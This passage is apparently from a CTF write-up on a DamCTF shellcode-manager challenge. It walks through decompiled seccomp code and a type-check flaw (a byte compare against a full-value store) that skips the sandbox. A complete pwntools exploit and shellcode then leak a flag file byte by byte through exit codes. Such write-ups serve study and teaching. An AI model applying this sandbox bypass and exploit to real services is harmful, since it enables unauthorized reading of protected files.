+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buff</span><span class="p">)();</span><span class="w"></span>
+<span class="nl">LAB_00101438</span><span class="p">:</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The program mmap's a dedicated chunk of memory for our shellcode, populating it exclusively with 0xc3, corresponding to the <code>ret</code> instruction. It then forks, the parent waiting for the child to complete.</p>
+<p>Here comes the restrictions. It first closes stderr, then, depending on whether the shellcode type is read, write or simple, it closes either stdout, stdin or both. This is a crucial detail for this challenge. Reading the code during the ctf, I mistakingly concluded that both stdin and stdout would be closed, no matter what, leading me to question the functionality of shellcode types. This would also shape our teams solution.</p>
+<p>After closing standard file descriptors, the program calls another function, <code>shellcode_seccomp</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">long</span><span class="w"> </span><span class="nf">shellcode_seccomp</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">read</span><span class="p">,</span><span class="kt">char</span><span class="w"> </span><span class="n">write</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">res</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">sec</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">success</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">sec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_init</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sec</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_rule_add_exact</span><span class="p">(</span><span class="n">sec</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">231</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">-1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">res</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">read</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_rule_add_exact</span><span class="p">(</span><span class="n">sec</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">write</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_rule_add_exact</span><span class="p">(</span><span class="n">sec</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">sec</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">-1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">res</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">seccomp_release</span><span class="p">(</span><span class="n">sec</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">success</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>This function creates a strict seccomp ruleset, allowing either read, write or none of the two syscalls. It additionally allows syscall 231, exit_group, most likely to call <code>exit</code> at the very end. Of course, this leads to the question, what can we do with these syscalls?</p>
+<hr />
+<h3>Vulnerability</h3>
+<p>Our team initially thought of the challenge as a heap exploitation challenge. Due to my oversight in <code>run_shellcode</code>, I came up with the idea to leak addresses through the exit_group syscall, as the main process prints the status code of the child. Combining this with something like an arbitrary write through heap exploitation, we could perhaps pop a shell (though maybe not).</p>
+<p>In the end, no heap vulnerability seemed present; the code was rock solid. We did, however, discover a vulnerability in the edit function:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prompt_string</span><span class="p">(</span><span class="s">&quot;Do you want to change the shellcode type?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode type (1=simple, 2=read, 3=write): &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">buff</span><span class="p">.</span><span class="n">_0_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">buff</span><span class="p">.</span><span class="n">_16_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">buff</span><span class="p">.</span><span class="n">_32_16_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w">  </span><span class="p">[</span><span class="mi">16</span><span class="p">])</span><span class="mh">0x0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">buff</span><span class="p">.</span><span class="n">_48_2_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">fgets</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">buff_int</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strtol</span><span class="p">(</span><span class="n">buff</span><span class="p">,(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="n">byte</span><span class="p">)((</span><span class="kt">char</span><span class="p">)</span><span class="n">buff_int</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1U</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bad type!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">choice2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_0010179a</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>As ghidra can be quite aggressive, I didn't initially spot the problem. It turns out, however, that the type cast to byte in the last comparison, is exactly what it seems. Inspecting the disassembly:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="err">0010175</span><span class="nf">e</span><span class="w"> </span><span class="no">e8</span><span class="w"> </span><span class="no">bd</span><span class="w"> </span><span class="no">f9</span><span class="w">        </span><span class="no">CALL</span><span class="w">       </span><span class="no">libc.so.6</span><span class="p">::</span><span class="no">strtol</span><span class="w">                                </span><span class="no">long</span><span class="w"> </span><span class="no">strtol</span><span class="p">(</span><span class="no">char</span><span class="w"> </span><span class="p">*</span><span class="w"> </span><span class="no">__nptr</span><span class="p">,</span><span class="w"> </span><span class="no">char</span><span class="w"> </span>
+<span class="w">                 </span><span class="no">ff</span><span class="w"> </span><span class="no">ff</span><span class="w"></span>
+<span class="w">        </span><span class="err">00101763</span><span class="w"> </span><span class="err">48</span><span class="w"> </span><span class="err">89</span><span class="w"> </span><span class="nf">c3</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">RBX</span><span class="p">,</span><span class="no">RAX</span><span class="w"></span>
+<span class="w">        </span><span class="err">00101766</span><span class="w"> </span><span class="err">8</span><span class="nf">d</span><span class="w"> </span><span class="mi">40</span><span class="w"> </span><span class="no">ff</span><span class="w">        </span><span class="no">LEA</span><span class="w">        </span><span class="no">EAX</span><span class="p">,[</span><span class="no">RAX</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">-0</span><span class="no">x1</span><span class="p">]</span><span class="w"></span>
+<span class="w">        </span><span class="err">00101769</span><span class="w"> </span><span class="err">3</span><span class="nf">c</span><span class="w"> </span><span class="mi">02</span><span class="w">           </span><span class="no">CMP</span><span class="w">        </span><span class="no">AL</span><span class="p">,</span><span class="mi">0x2</span><span class="w"></span>
+<span class="w">        </span><span class="err">0010176</span><span class="nf">b</span><span class="w"> </span><span class="mi">77</span><span class="w"> </span><span class="mi">52</span><span class="w">           </span><span class="no">JA</span><span class="w">         </span><span class="no">LAB_001017bf</span><span class="w"></span>
+</code></pre></div>
+
+<p>It indeed compares the <code>AL</code> register, that being the first byte of <code>RAX</code>. However, when it further down stores the value, it does something else:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="err">00101780</span><span class="w"> </span><span class="err">89</span><span class="w"> </span><span class="err">5</span><span class="nf">d</span><span class="w"> </span><span class="mi">04</span><span class="w">        </span><span class="no">MOV</span><span class="w">        </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">RBP</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x4</span><span class="p">],</span><span class="no">EBX</span><span class="w"></span>
+</code></pre></div>
+
+<p>It instead stores <code>EBX</code>, that being the first four bytes of <code>RBX</code>. As a result, specifying a value such as 0xff01 would result in a successful comparison, after which the whole value would be stored. To see why this is critical, we must go back to <code>run_shellcode</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shell</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">joined_r0x00101408</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">type</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">joined_r0x00101408</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_0010141c</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="nl">LAB_0010141c</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shellcode_seccomp</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="nl">joined_r0x00101408</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_00101438</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buff</span><span class="p">)();</span><span class="w"></span>
+<span class="nl">LAB_00101438</span><span class="p">:</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+
+<p>Following the flow, the program only calls <code>shellcode_seccomp</code> if the type is either 1, 2 or 3. For any other value, the function is never called, meaning, that there is no protection in place, allowing us to execute whatever we want.</p>
+<hr />
+<h3>Exploitation</h3>
+<p>Assuming that stdin, stdout and stderr is closed, our team went ahead with more creative methods of exploitation. Our first method, was to reopen stdin and stdout through an interesting method described <a href="https://github.com/0xBADCA7/ctf-3/blob/master/TokyoWesterns18/pwn/load/Readme.md">here</a>. We initially saw success, being able to pop a somewhat usable shell on our local machines. However, we were met with disapointment, as the exploit never functioned on remote.</p>
+<p>As a result, we moved to more desperate measures. Here, we fully utilized the opening created by exit_group.</p>
+<p>With restrictions lifted from our shellcode, we concluded, that we could simply read the flag, byte by byte, by calling exit_group with the given byte of the flag. We could then decode the result, and voila, we would have the flag. This assumed that we knew the path to the flag, which we guesed would be "./flag", given the previous binary challenges.</p>
+<hr />
+<h3>Solution</h3>
+<p>Performing this exploit, we ran into the problem, that the program would disconnect after executing the shellcode 13 times. Exactly 13 times. This is either a bug or intentional. One of us chose to simply reconnect after every byte, I simply chose to limit the number of bytes read to 13 bytes. </p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;error&quot;</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./scm_patched&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/peda/peda.py&quot;</span>
+<span class="c1"># conn = gdb.debug(&quot;./scm_patched&quot;, &#39;&#39;&#39;</span>
+<span class="c1"># set follow-fork-mode child</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./scm_patched&quot;</span><span class="p">)</span>
+<span class="c1"># conn = connect(&quot;chals.damctf.xyz&quot;, 30200)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">    xor rax, rax</span>
+<span class="s1">    add al, 2</span>
+<span class="s1">    xor rsi, rsi</span>
+<span class="s1">    lea rdi, [rip + file]</span>
+<span class="s1">    syscall</span>
+
+<span class="s1">    xor rdi, rdi</span>
+<span class="s1">    lea rsi, [rip + buff]</span>
+<span class="s1">    xor rdx, rdx</span>
+<span class="s1">    add rdx, 100</span>
+<span class="s1">    syscall</span>
+
+<span class="s1">    lea rdx, [rip + buff]</span>
+<span class="s1">    add rdx, 0xde</span>
+<span class="s1">    mov rdi, [rdx]</span>
+<span class="s1">    xor rax, rax</span>
+<span class="s1">    add al, 231</span>
+<span class="s1">    syscall</span>
+
+<span class="s1">    file:</span>
+<span class="s1">    .ascii &quot;./flag&quot;</span>
+<span class="s1">    .byte 0x0</span>
+<span class="s1">    buff:</span>
+<span class="s1">    .byte 0x0</span>
+<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+
+<span class="n">p1</span><span class="p">,</span> <span class="n">p2</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xde</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># Split lea offset to target specific bytes</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>  <span class="c1"># Create new shellcode</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>  <span class="c1"># Type 1, simple</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;10&quot;</span><span class="p">)</span>  <span class="c1"># Length of shellcode</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;lulz&quot;</span><span class="p">)</span>  <span class="c1"># Random shellcode, will be changed</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>  <span class="c1"># Edit shellcode</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>  <span class="c1"># Shellcode at index 0</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;y&quot;</span><span class="p">)</span>  <span class="c1"># y/n edit type</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;65281&quot;</span><span class="p">)</span>  <span class="c1"># 0xff01, any value to break the comparison</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;n&quot;</span><span class="p">)</span>  <span class="c1"># y/n edit shellcode</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>  <span class="c1"># Remote seemed to crash after 13 bytes leaked</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>  <span class="c1"># Edit shellcode</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>  <span class="c1"># Shellcode at index 0</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;n&quot;</span><span class="p">)</span>  <span class="c1"># y/n edit type</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;y&quot;</span><span class="p">)</span>  <span class="c1"># y/n edit shellcode</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># Length of payload</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p1</span> <span class="o">+</span> <span class="nb">bytearray</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="p">))</span> <span class="o">+</span> <span class="n">p2</span><span class="p">)</span>  <span class="c1"># Insert specific byte index to read</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>  <span class="c1"># Execute shellcode</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>  <span class="c1"># Shellcode at index 0</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; code &quot;</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">leak</span> <span class="o">==</span> <span class="s2">&quot;}&quot;</span><span class="p">:</span>  <span class="c1"># We have reached the end</span>
+        <span class="nb">print</span><span class="p">()</span>
+        <span class="k">break</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;6&quot;</span><span class="p">)</span>  <span class="c1"># Exit the program</span>
+</code></pre></div>
+
+<p>Running it once, should give the first 13 characters in the flag. The line specifying byte index can simply be changed (e.g. <code>bytearray((i + 13, ))</code> to offset by 13) to read the segments sequentially. Running the exploit a few times, incrementing the offset by 13 each time, I eventually got the flag. I was, however, just 10 minutes late to the punch, the challenge being solved by one of my teammates.</p>
+<hr />
+<h3>Note</h3>
